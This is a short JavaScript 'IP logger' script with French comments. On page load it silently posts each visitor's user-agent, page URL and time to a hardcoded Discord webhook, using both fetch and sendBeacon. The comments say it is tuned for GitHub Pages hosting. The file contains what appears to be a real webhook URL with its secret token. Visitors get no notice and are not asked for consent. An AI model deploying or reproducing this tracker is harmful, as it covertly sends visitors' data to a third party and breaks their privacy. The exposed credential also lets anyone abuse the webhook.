// =============================================
// ULTRABOT IP LOGGER v5 - FIX 400 ERROR
// =============================================

const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz"; // ← Remplace par ta vraie webhook

async function sendToWebhook() {
    const payload = {
        username: "UltraBot Logger",
        embeds: [{
            title: "🔴 Nouveau visiteur UltraBot",
            color: 0xe01a1a,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "IP", value: "`Récupération en cours...`", inline: true },
                { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 250)}\`\`\``, inline: false },
                { name: "URL", value: window.location.href, inline: false },
                { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
            ]
        }]
    };

    try {
        const response = await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            mode: "no-cors"
        });

        console.log("%c[UltraBot] ✅ Requête envoyée (no-cors)", "color: lime");
    } catch (e) {
        console.log("%c[UltraBot] Erreur fetch", "color: red");
    }
}

// Méthode Beacon (la plus fiable sur GitHub Pages)
function sendWithBeacon() {
    const data = {
        content: "**UltraBot - Visiteur détecté via Beacon**",
        username: "UltraBot Logger"
    };

    const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
    navigator.sendBeacon(WEBHOOK, blob);
    console.log("%c[UltraBot] Beacon envoyé", "color: orange");
}

// Lancement
window.addEventListener('load', () => {
    console.log("%c[UltraBot] Script chargé - Tentative...", "color: red");

    setTimeout(() => {
        sendToWebhook();
        sendWithBeacon();        // Méthode la plus fiable
    }, 800);
});
